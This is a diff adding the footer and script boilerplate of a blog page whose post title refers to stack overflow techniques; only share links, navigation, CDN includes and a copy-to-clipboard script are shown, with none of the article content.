+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&name=栈溢出新姿势&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&t=栈溢出新姿势"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    Xu4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/about/">about</a></li><!--
+     --><!--
+       --><li><a href="/archives/">articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">category</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     --><!--
+       --><li><a href="/search/">search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
